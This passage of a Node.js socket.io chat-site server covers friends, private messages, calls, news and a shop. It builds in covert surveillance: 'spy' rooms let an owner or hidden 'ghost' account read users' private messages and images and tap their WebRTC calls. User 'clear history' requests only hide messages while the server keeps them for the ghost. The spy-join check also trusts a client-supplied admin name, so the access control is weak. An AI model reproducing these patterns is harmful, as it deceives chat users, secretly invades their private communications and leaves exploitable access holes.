      } catch(e) {}
    }
    socket.emit('friend-rejected-ok', { from: data.from });
  });

  socket.on('friend-remove', async (data) => {
    const from = chatUsers[socket.id];
    if (!from || !data.username) return;
    if (useDB) {
      try {
        const u1 = [from.name, data.username].sort()[0];
        const u2 = [from.name, data.username].sort()[1];
        await db.query(`DELETE FROM friends WHERE user1=$1 AND user2=$2`, [u1, u2]);
        await db.query(
          `DELETE FROM friend_requests WHERE (from_user=$1 AND to_user=$2) OR (from_user=$2 AND to_user=$1)`,
          [from.name, data.username]
        );
      } catch(e) {}
    }
    socket.emit('friend-removed', { username: data.username });
  });

  socket.on('load-friends', async (data) => {
    const user = chatUsers[socket.id];
    if (!user) return;
    if (!useDB) { socket.emit('friends-data', { friends: [], requests: [], sent: [] }); return; }
    try {
      const fr = await db.query(
        `SELECT from_user as "from", created_at as time FROM friend_requests
         WHERE to_user=$1 AND status='pending' ORDER BY created_at DESC`,
        [user.name]
      );
      const fl = await db.query(
        `SELECT CASE WHEN user1=$1 THEN user2 ELSE user1 END as username, created_at
         FROM friends WHERE user1=$1 OR user2=$1 ORDER BY created_at DESC`,
        [user.name]
      );
      // الطلبات التي أرسلها المستخدم ولم تُقبل بعد
      const fs = await db.query(
        `SELECT to_user as username FROM friend_requests
         WHERE from_user=$1 AND status='pending'`,
        [user.name]
      );
      socket.emit('friends-data', { friends: fl.rows, requests: fr.rows, sent: fs.rows.map(r=>r.username) });
    } catch(e) {
      socket.emit('friends-data', { friends: [], requests: [], sent: [] });
    }
  });

  // ===== تحميل تاريخ المحادثة الخاصة عبر Socket =====
  socket.on('load-pm-history', async (data) => {
    const user = chatUsers[socket.id]; if (!user) return;
    const otherUser = data.with;
    if (!otherUser) return;
    const convKey = [user.name, otherUser].sort().join('||');
    const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
    try {
      if (useDB) {
        // تحقق إذا كان العضو قد مسح هذه المحادثة
        let clearedAt = null;
        if (user.name !== ghostName && user.rank !== 'ghost') {
          try {
            const cr = await db.query(
              `SELECT cleared_at FROM pm_cleared WHERE username=$1 AND conv_key=$2`,
              [user.name, convKey]
            );
            if (cr.rows.length > 0) clearedAt = cr.rows[0].cleared_at;
          } catch(e) {}
        }
        const query = clearedAt
          ? `SELECT from_user as "from", to_user as "to", text, time, COALESCE(msg_type,'private') as type, media_data as "imageData" FROM private_messages WHERE conv_key=$1 AND created_at > $2 ORDER BY created_at ASC LIMIT 200`
          : `SELECT from_user as "from", to_user as "to", text, time, COALESCE(msg_type,'private') as type, media_data as "imageData" FROM private_messages WHERE conv_key=$1 ORDER BY created_at ASC LIMIT 200`;
        const params = clearedAt ? [convKey, clearedAt] : [convKey];
        const r = await db.query(query, params);
        socket.emit('pm-conv-history', { with: otherUser, messages: r.rows, key: convKey });
      } else {
        const msgs = memPMs[convKey] || [];
        socket.emit('pm-conv-history', { with: otherUser, messages: msgs, key: convKey });
      }
    } catch(e) {}
  });
  // ===== نهاية تحميل تاريخ المحادثة =====

  // PRIVATE MESSAGES
  // Admin adds quiz question via socket (fallback)
  // ===== VOICE MESSAGES (relay) =====
  socket.on('voice-message', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.room || !data.data) return;
    if (data.data.length > 5 * 1024 * 1024) return; // max 5MB base64 (~1min audio)
    // Broadcast to room (except sender)
    socket.to(data.room).emit('voice-message', {
      room: data.room,
      data: data.data,
      duration: Math.min(data.duration || 0, 60),
      from: user.name
    });
  });

  socket.on('pm-image', (data) => {
    const sender = chatUsers[socket.id];
    if (!sender || !data.to || !data.imageData) return;
    if (data.imageData.length > 4 * 1024 * 1024) { socket.emit('spam-warning','❌ الصورة كبيرة جداً'); return; }
    const pm = {
      type: 'pm-image',
      from: sender.name,
      to: data.to,
      imageData: data.imageData,
      imageType: data.imageType || 'image',
      time: getTime()
    };
    const convKey = [sender.name, data.to].sort().join('||');
    if (!memPMs[convKey]) memPMs[convKey] = [];
    memPMs[convKey].push({...pm, ts: Date.now()});
    if (memPMs[convKey].length > 500) memPMs[convKey].shift();
    // حفظ في DB
    if (useDB) {
      db.query(
        `INSERT INTO private_messages (conv_key,from_user,to_user,text,time,msg_type,media_data) VALUES ($1,$2,$3,$4,$5,'pm-image',$6)`,
        [convKey, sender.name, data.to, '[صورة]', getTime(), data.imageData]
      ).catch(()=>{});
    }
    // أرسل للمرسل تأكيداً
    socket.emit('pm-image-msg', pm);
    // أرسل للمستقبل إذا كان متصلاً
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('pm-image-msg', pm);
    // أرسل للمراقبين (spy)
    const spyRoom = 'spy||' + convKey;
    io.to(spyRoom).emit('spy-pm', pm);
  });

  socket.on('pm-voice-message', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.to || !data.data) return;
    if (data.data.length > 5 * 1024 * 1024) return;
    const vm = {
      type: 'pm-voice',
      from: user.name,
      to: data.to,
      data: data.data,
      duration: Math.min(data.duration || 0, 60),
      time: getTime(),
      ts: Date.now()
    };
    const convKey = [user.name, data.to].sort().join('||');
    if (!memPMs[convKey]) memPMs[convKey] = [];
    memPMs[convKey].push(vm);
    if (memPMs[convKey].length > 500) memPMs[convKey].shift();
    // حفظ في DB
    if (useDB) {
      db.query(
        `INSERT INTO private_messages (conv_key,from_user,to_user,text,time,msg_type,media_data) VALUES ($1,$2,$3,$4,$5,'pm-voice',$6)`,
        [convKey, user.name, data.to, '[رسالة صوتية]', getTime(), vm.data]
      ).catch(()=>{});
    }
    socket.emit('pm-voice-message', vm);
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('pm-voice-message', vm);
  });

  // ===== WebRTC CALLS (relay) =====
  socket.on('request-room-users', (roomId) => {
    const user = chatUsers[socket.id];
    if (!user) return;
    const room = roomId || user.room;
    socket.emit('room-users', getRoomUsers(room));
  });

  socket.on('update-profile-info', (data) => {
    const user = chatUsers[socket.id];
    if (!user) return;
    if (data.age) user.age = data.age;
    if (data.gender) user.gender = data.gender;
    // Broadcast updated user list to room
    io.to(user.room).emit('room-users', getRoomUsers(user.room));
  });

  socket.on('call-offer', async (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.to) return;
    // Check if user has enough gold (skip for owner/ghost)
    if (!['owner','owner_admin','ghost'].includes(user.rank)) {
      const cost = data.type === 'video' ? callCostConfig.video : callCostConfig.voice;
      if (cost > 0) {
        const cur = await getGold(user.name);
        if ((cur.gold||0) < cost) {
          socket.emit('call-no-gold', {required:cost, have:cur.gold||0, type:data.type});
          return;
        }
        // Deduct gold
        const newGold = (cur.gold||0) - cost;
        await setGold(user.name, newGold, cur.diamond||0);
        user.gold = newGold;
        socket.emit('gold-updated', {gold:newGold, diamond:cur.diamond||0});
      }
    }
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-offer', { ...data, from: user.name });
    const convKey = [user.name, data.to].sort().join('||');
    activeCalls[convKey] = {
      type: data.type, startTime: Date.now(),
      user1: user.name, user2: data.to,
      callerSid: socket.id, receiverName: data.to,
      offer: data.offer
    };
    // Tell any watching spy to connect to BOTH sides
    const spyRoom = 'spy||' + convKey;
    io.to(spyRoom).emit('spy-call-offer', { ...data, from: user.name, convKey, callerSid: socket.id });
  });

  socket.on('call-answer', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-answer', data);
    if (user) {
      const convKey = [user.name, data.to].sort().join('||');
      const receiverSid = socket.id;
      const receiverName = user.name;
      // Delay so spy client has time to finish PC1 setup first
      setTimeout(() => {
        io.to('spy||' + convKey).emit('spy-receiver-ready', {
          receiverName, receiverSid, convKey
        });
      }, 2500);
    }
  });

  socket.on('call-ice', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-ice', data);
    if (user) {
      const convKey = [user.name, data.to].sort().join('||');
      io.to('spy||' + convKey).emit('spy-call-ice', { ...data, from: user.name });
    }
  });

  socket.on('call-reject', (data) => {
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-reject', {});
  });

  socket.on('call-end', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-end', {});
    if (user && data.to) {
      const convKey = [user.name, data.to].sort().join('||');
      delete activeCalls[convKey];
      io.to('spy||' + convKey).emit('spy-call-ended', { convKey });
    }
  });

  // ===== SPY WebRTC relay (clean) =====
  // Spy sends offer to a specific user (caller or receiver)
  socket.on('spy-to-user-offer', (data) => {
    // data: { targetSid, offer, spyId }
    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-offer', { offer: data.offer, spyId: socket.id });
  });
  // User sends answer back to spy
  socket.on('user-to-spy-answer', (data) => {
    // data: { spyId, answer }
    if (data.spyId) io.to(data.spyId).emit('spy-from-user-answer', { answer: data.answer, userSid: socket.id });
  });
  // ICE relay between spy and user
  socket.on('spy-to-user-ice', (data) => {
    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-ice', { candidate: data.candidate, spyId: socket.id });
  });
  socket.on('user-to-spy-ice', (data) => {
    if (data.spyId) io.to(data.spyId).emit('spy-from-user-ice', { candidate: data.candidate });
  });

  socket.on('admin-add-quiz-q', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !['owner','owner_admin','super_admin','admin'].includes(user.rank)) return;
    if (!data.q || !data.a) return;
    const newQ = { q: data.q.trim(), a: data.a.trim(), hint: data.hint||'', points: parseInt(data.points)||50 };
    adminQuizQuestions.push(newQ);
    Object.keys(quizState).forEach(roomId => {
      if (quizState[roomId]) quizState[roomId].pool.push({...newQ});
    });
    socket.emit('quiz-q-added', { ok:true, count: adminQuizQuestions.length });
  });

  socket.on('private-message',(data)=>{
    const sender=chatUsers[socket.id]; if (!sender) return;
    if (!data.to || !data.text) return;
    // تحقق من قفل الخاص
    if (pmLock[data.to] && pmLock[data.to].has(sender.name)) {
      socket.emit('pm-locked', { from: data.to });
      return;
    }
    const pm={type:'private',from:sender.name,to:data.to,text:data.text,time:getTime(),fromRank:sender.rank,fromRankInfo:RANKS[sender.rank]};
    const convKey = [sender.name, data.to].sort().join('||');
    if (!memPMs[convKey]) memPMs[convKey] = [];
    memPMs[convKey].push({...pm, ts: Date.now()});
    if (memPMs[convKey].length > 500) memPMs[convKey].shift();
    if (useDB) {
      db.query(
        `INSERT INTO private_messages (conv_key,from_user,to_user,text,time) VALUES ($1,$2,$3,$4,$5)`,
        [convKey, sender.name, data.to, data.text, getTime()]
      ).catch(()=>{});
    }
    socket.emit('private-message', pm);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.to);
    if (sid) io.to(sid).emit('private-message',pm);
    const spyRoom = 'spy||' + convKey;
    io.to(spyRoom).emit('spy-pm', pm);
  });

  // ===== مسح تاريخ المحادثة الخاصة (للعضو فقط - لا يمس حساب ghost) =====
  socket.on('pm-clear-history', async (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.with) return;
    const convKey = [user.name, data.with].sort().join('||');
    const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';

    // إذا كان المستخدم هو ghost — يمسح فعلاً من DB
    if (user.rank === 'ghost' || user.name === ghostName) {
      if (useDB) {
        try {
          await db.query(`DELETE FROM private_messages WHERE conv_key=$1`, [convKey]);
        } catch(e) {}
      }
      if (memPMs[convKey]) delete memPMs[convKey];
      socket.emit('pm-cleared', { with: data.with });
      return;
    }

    // للأعضاء العاديين — مسح محلي فقط بدون حذف من DB (يبقى عند ghost)
    // نحفظ في جدول خاص أن هذا العضو مسح المحادثة
    if (useDB) {
      try {
        await db.query(
          `INSERT INTO pm_cleared (username, conv_key, cleared_at)
           VALUES ($1, $2, NOW())
           ON CONFLICT (username, conv_key) DO UPDATE SET cleared_at=NOW()`,
          [user.name, convKey]
        );
      } catch(e) {}
    }
    // مسح من الذاكرة المحلية للسيرفر لهذا المستخدم فقط
    socket.emit('pm-cleared', { with: data.with });
  });

  socket.on('pm-lock-user', (data) => {
    const user = chatUsers[socket.id]; if (!user || !data.target) return;
    if (!pmLock[user.name]) pmLock[user.name] = new Set();
    pmLock[user.name].add(data.target);
  });
  socket.on('pm-unlock-user', (data) => {
    const user = chatUsers[socket.id]; if (!user || !data.target) return;
    if (pmLock[user.name]) pmLock[user.name].delete(data.target);
  });

  // ===== SPY: JOIN/LEAVE PM CONVERSATION =====
  socket.on('spy-join', async (data) => {
    const admin = chatUsers[socket.id];
    // Also allow if rank is verified from DB (in case chatUsers not yet populated)
    let adminRank = admin?.rank;
    if (!adminRank && data.adminName && useDB) {
      try {
        const r = await db.query('SELECT rank FROM users WHERE username=$1',[data.adminName]);
        adminRank = r.rows[0]?.rank;
      } catch(e) {}
    }
    if (adminRank !== 'owner' && adminRank !== 'ghost') return;
    const key = [data.user1, data.user2].sort().join('||');
    const spyRoom = 'spy||' + key;
    socket.join(spyRoom);
    // Load history from DB or memory
    let history = memPMs[key] || [];
    if (useDB) {
      try {
        const r = await db.query(
          `SELECT from_user as "from", to_user as "to", text, time, COALESCE(msg_type,'private') as type, media_data as "imageData" FROM private_messages WHERE conv_key=$1 ORDER BY created_at ASC LIMIT 200`,
          [key]
        );
        if (r.rows.length > 0) history = r.rows;
      } catch(e) {}
    }
    socket.emit('spy-history', { key, user1: data.user1, user2: data.user2, messages: history });
    // If active call → send offer with callerSid so spy can connect to both parties
    if (activeCalls[key]) {
      const call = activeCalls[key];
      // Find callerSid and receiverSid from chatUsers
      const callerSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user1);
      const receiverSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user2);
      socket.emit('spy-call-offer', {
        offer: call.offer || null,
        type: call.type,
        from: call.user1,
        convKey: key,
        callerSid: callerSid || null,
        receiverSid: receiverSid || null
      });
      // Delay receiver-ready so client has time to create PC1 first
      if (receiverSid) {
        setTimeout(() => {
          socket.emit('spy-receiver-ready', {
            receiverName: call.user2, receiverSid, convKey: key
          });
        }, 2500);
      }
    }
  });
  socket.on('spy-leave', (data) => {
    const key = [data.user1, data.user2].sort().join('||');
    socket.leave('spy||' + key);
  });
  // ===== END SPY =====

  // WEBRTC VOICE/VIDEO SIGNALING
  socket.on('voice-join',(roomId)=>{
    const user=chatUsers[socket.id]; if (!user) return;
    if (!voiceRooms[roomId]) voiceRooms[roomId]=[];
    voiceRooms[roomId].forEach(pid=>{
      io.to(pid).emit('voice-user-joined',{peerId:socket.id,username:user.name});
      socket.emit('voice-user-joined',{peerId:pid,username:chatUsers[pid]?.name});
    });
    voiceRooms[roomId].push(socket.id);
    io.to(roomId).emit('voice-room-update',{roomId,users:voiceRooms[roomId].map(id=>chatUsers[id]?.name).filter(Boolean)});
  });
  socket.on('voice-leave',(roomId)=>{
    if (voiceRooms[roomId]){
      voiceRooms[roomId]=voiceRooms[roomId].filter(id=>id!==socket.id);
      io.to(roomId).emit('voice-user-left',{peerId:socket.id});
      io.to(roomId).emit('voice-room-update',{roomId,users:voiceRooms[roomId].map(id=>chatUsers[id]?.name).filter(Boolean)});
    }
  });
  socket.on('rtc-offer',(data)=>io.to(data.to).emit('rtc-offer',{from:socket.id,offer:data.offer}));
  socket.on('rtc-answer',(data)=>io.to(data.to).emit('rtc-answer',{from:socket.id,answer:data.answer}));
  socket.on('rtc-ice',(data)=>io.to(data.to).emit('rtc-ice',{from:socket.id,candidate:data.candidate}));

  socket.on('disconnect', async () => {
    const user = chatUsers[socket.id]; if (!user) return;
    const room = user.room;
    const userName = user.name;
    const userRank = user.rank;

    // إزالة من غرف الصوت فوراً
    Object.keys(voiceRooms).forEach(vr => {
      if (voiceRooms[vr].includes(socket.id)) {
        voiceRooms[vr] = voiceRooms[vr].filter(id => id !== socket.id);
        io.to(vr).emit('voice-user-left', { peerId: socket.id });
      }
    });

    // grace period - ننتظر 30 ثانية قبل اعتبار المستخدم خرج فعلاً
    // (يحدث هذا عند التبديل لتطبيق آخر مؤقتاً)
    setTimeout(async () => {
      // تحقق: هل المستخدم عاد واتصل من جديد؟
      const stillConnected = Object.values(chatUsers).find(u => u.name === userName);
      if (stillConnected) return; // عاد - لا تخرجه

      // لم يعد - أخرجه
      delete chatUsers[socket.id];
      if (userRank !== 'ghost') {
        const msg = await saveMessage(room, null, `👋 ${userName} غادر الموقع`, 'system');
        io.to(room).emit('message', msg);
      }
      io.to(room).emit('room-users', getRoomUsers(room));
      io.emit('online-count', getOnlineCount());
      broadcastRoomCounts();
    }, 900000); // 15 دقائق grace period - يمنع الخروج عند التبديل لمواقع أخرى
  });
});

const PORT = process.env.PORT || 3000;
// last-updated: 1773171725

// ===== NEWS SYSTEM =====
let newsDB = []; // {id, type, title, body, time, ts}
let _newsIdCounter = 1;

app.get('/api/news', (req,res) => {
  res.json({ok:true, news: newsDB});
});

app.get('/api/admin/news', adminAuth, (req,res) => {
  res.json({ok:true, news: newsDB});
});

app.post('/api/admin/news/add', adminAuth, (req,res) => {
  const {type, title, body, adminName, adminRank} = req.body;
  if(!title||!body) return res.json({ok:false, msg:'العنوان والمحتوى مطلوبان'});
  const time = new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false});
  const item = {id:_newsIdCounter++, type:type||'news', title, body, time, ts:Date.now()};
  newsDB.unshift(item);
  if(newsDB.length > 100) newsDB.pop();
  logAction(adminName||'أدمن', adminRank||'admin', '📢 نشر خبر', title);
  // إرسال للجميع المتصلين
  io.emit('new-news', item);
  // إذا broadcast أرسل أيضاً كرسالة فورية
  if(type === 'broadcast') {
    io.emit('broadcast-msg', {title, body, from: adminName||'الإدارة', time});
  }
  res.json({ok:true, item});
});

app.post('/api/admin/news/delete', adminAuth, (req,res) => {
  const {id} = req.body;
  newsDB = newsDB.filter(n => n.id !== id);
  res.json({ok:true});
});

// ===== GOLD SHOP SYSTEM =====
let shopItems = []; // {id, name, icon, gold, diamond, desc, price}
let shopOrders = []; // {id, username, itemId, itemName, itemGold, itemDiamond, time, done}
let _shopIdCounter = 1;
let _orderIdCounter = 1;

app.get('/api/shop', (req,res) => {
  res.json({ok:true, items: shopItems});
});

app.post('/api/shop/buy', async (req,res) => {
  const {itemId, username} = req.body;
  if(!username || !itemId) return res.json({ok:false, msg:'بيانات ناقصة'});
  const item = shopItems.find(i=>i.id===parseInt(itemId));
  if(!item) return res.json({ok:false, msg:'العنصر غير موجود'});
  const time = new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false});
  const order = {
    id: _orderIdCounter++,
    username,
    itemId: item.id,
    itemName: item.name,
    itemGold: item.gold||0,
    itemDiamond: item.diamond||0,
    time,
    done: false
  };
  shopOrders.unshift(order);
  if(shopOrders.length > 200) shopOrders.pop();
  // إشعار للأدمن المتصلين
  io.emit('shop-new-order', order);
  res.json({ok:true});
});

app.get('/api/admin/shop', adminAuth, (req,res) => {
  res.json({ok:true, items: shopItems, orders: shopOrders});
});

app.post('/api/admin/shop/add', adminAuth, (req,res) => {
  const {name, icon, gold, diamond, desc, price, adminName} = req.body;
  if(!name) return res.json({ok:false, msg:'اسم العنصر مطلوب'});
  const item = {
    id: _shopIdCounter++,
    name,
    icon: icon||'💰',
    gold: parseInt(gold)||0,
    diamond: parseInt(diamond)||0,
    desc: desc||'',
    price: price||''
  };
  shopItems.push(item);
  logAction(adminName||'أدمن', 'admin', '🛒 إضافة عنصر للمتجر', name);
  // أخبر الجميع بتحديث المتجر
  io.emit('shop-updated', shopItems);
  res.json({ok:true, item});
});

app.post('/api/admin/shop/delete', adminAuth, (req,res) => {
  const {id} = req.body;
  shopItems = shopItems.filter(i=>i.id!==parseInt(id));
  io.emit('shop-updated', shopItems);
  res.json({ok:true});
});

app.post('/api/admin/shop/order-done', adminAuth, (req,res) => {
  const {orderId} = req.body;
  const order = shopOrders.find(o=>o.id===parseInt(orderId));
  if(order) order.done = true;
  res.json({ok:true});
});
// ===== END NEWS & SHOP =====

// ===== MUTED USERS API =====
// جلب قائمة المكتومين
app.get('/api/admin/muted', adminAuth, (req, res) => {
  const list = Array.from(mutedUsers).map(username => {
    const onlineUser = Object.values(chatUsers).find(u => u.name === username);
    return {
      username,
      online: !!onlineUser,
      room: onlineUser?.room || null,
      rank: onlineUser?.rank || null,
    };
  });
  res.json({ ok: true, muted: list, count: list.length });
});

// فك كتم عبر API (من لوحة الأدمن)
app.post('/api/admin/unmute', adminAuth, (req, res) => {
  const { username, adminName, adminRank } = req.body;
  if (!username) return res.json({ ok: false, msg: 'اسم المستخدم مطلوب' });
  mutedUsers.delete(username);
  delete warnCount[username];
  const sid = Object.keys(chatUsers).find(id => chatUsers[id].name === username);
  if (sid) io.to(sid).emit('unmuted', 'تم رفع الكتم عنك');
  logAction(adminName || 'أدمن', adminRank || 'admin', '🔊 رفع الكتم', username);
  res.json({ ok: true });
});
// ===== END MUTED USERS API =====

// ===== REPORTS API =====
app.get('/api/admin/reports', adminAuth, (req, res) => {
  res.json({ ok: true, reports: reportsLog, count: reportsLog.length });
});
app.post('/api/admin/reports/clear', adminAuth, (req, res) => {
  reportsLog.length = 0;
  res.json({ ok: true });
});
// ===== END REPORTS API =====

initDB().then(() => server.listen(PORT, () => console.log(`غزل عراقي يعمل على المنفذ ${PORT}`)));

// ===== GLOBAL ERROR HANDLERS =====
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});
